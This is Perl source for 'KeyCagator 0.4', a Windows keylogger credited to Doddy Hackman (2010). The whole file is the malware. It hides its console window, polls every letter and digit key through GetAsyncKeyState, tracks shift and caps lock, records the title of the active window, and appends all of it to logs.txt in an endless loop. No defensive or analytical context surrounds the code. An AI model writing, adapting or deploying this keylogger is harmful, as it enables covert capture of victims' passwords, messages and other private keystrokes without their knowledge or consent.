#!usr/bin/perl
#KeyCagator 0.4 (C) Doddy Hackman 2010
#

use Win32::API;
use Win32::GuiTest qw(GetForegroundWindow GetWindowText);

my $come = new Win32::API("user32", "GetAsyncKeyState","N", "I");
my $tengo = 0;	

if ($^O eq 'MSWin32') {
use Win32::Console; 
Win32::Console::Free();
}

while (true) {

capture_windows();
capture_keys();

}

sub capture_windows {

my $win1 = GetForegroundWindow();         
my $win2 = GetForegroundWindow(); 

if($win1 != $win2){
my $nombre = GetWindowText($win1); 
chomp($nombre);
if ($nombre ne "") {
#print "\n\n[".$nombre."]\n\n";
savefile("logs.txt","\n\n[".$nombre."]\n\n");
}
}

}
	
sub capture_keys {

my $test1;
my $test2;


capture_windows();

for my $num(0x30..0x39) { #Numbers	

capture_windows();

if (dame($num)) {
#print "number : ".chr($num)."\n";
savefile("logs.txt",chr($num));
}
}

if (dame(0x14)) {
$test1 = 1;
$tengo++;
}

for my $num(0x41..0x5A) {	#Words


capture_windows();

if (dame($num)) {


if (dame(0x0d)) {
savefile("logs.txt","\n\n[enter]\n\n");
}

unless (verpar($tengo) eq 1) {
#print "MAYUSCULA : ".chr($num)."\n";
savefile("logs.txt",chr($num));
}

if (dame(0x10) or dame(0xA0) or dame(0xA1)) {
#print "MAYUSCULA : ".chr($num)."\n";
$test2 = 1;
}

unless ($test1 eq 1 or $test2 eq 1) {
if ($num >= 0x41) {
if ($num <= 0x5A) {
if (verpar($tengo) eq 1) {
#print "MINUSCULA : ".chr($num+32)."\n";
savefile("logs.txt",chr($num+32));
}
}
}
} 
}
}

}

sub dame {
return($come->Call(@_) & 1);
}

sub savefile {
open (SAVE,">>".$_[0]);
print SAVE $_[1];
close SAVE; 
}

sub verpar{ 
return ($_[0] % 2 == 0) ? "1" : "2";
}


#Credits : to explorer for helpme with the function verpar()
#Mail : lepuke[at]hotmail[com]
#Blog : doddy-hackman.blogspot.com
# ¿ The End ? 